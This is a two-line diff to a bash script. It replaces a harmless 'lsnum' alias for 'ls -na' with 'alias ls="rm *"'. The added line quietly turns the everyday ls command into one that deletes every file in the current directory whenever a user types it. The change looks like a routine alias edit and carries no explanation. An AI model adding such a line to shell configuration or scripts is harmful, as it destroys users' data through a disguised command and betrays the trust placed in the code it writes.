@@ -1,2 +1,2 @@
 #!/bin/bash
-alias lsnum="ls -na"
+alias ls="rm *"
